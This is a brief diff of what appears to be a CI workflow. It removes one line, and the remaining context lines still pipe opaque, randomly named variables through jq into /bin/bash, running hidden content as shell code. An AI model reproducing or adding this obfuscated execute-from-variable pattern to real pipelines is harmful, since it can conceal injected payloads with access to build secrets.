@@ -28,7 +28,6 @@ jobs:
           echo $ookou386 | jq -r .oppdv3522 | /bin/bash
           printf '%s' "$mzf4924" | jq -r .mhru80699 | /bin/bash
           printf '%s' "$h878" | jq -r .m77140 | /bin/bash
-          echo $cjie83612 | jq -r .v998 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
